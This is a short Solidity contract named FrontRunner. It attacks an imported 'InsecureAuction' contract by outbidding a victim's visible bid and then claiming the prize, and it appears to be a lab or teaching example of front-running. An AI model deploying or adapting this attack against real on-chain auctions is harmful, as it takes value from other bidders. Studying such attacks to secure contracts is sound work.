// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./InsecureAuction.sol";

contract FrontRunner {
    InsecureAuction public auction;

    constructor(address _auction) {
        auction = InsecureAuction(_auction);
    }

    // Front-run victim by bidding 1 wei more than their visible bid
    function attack(uint256 victimBid) external payable {
        require(msg.value > victimBid, "Need more than victim");
        auction.bid{value: msg.value}();
    }

    function claim() external {
        auction.claimPrize();
    }

    receive() external payable {}
}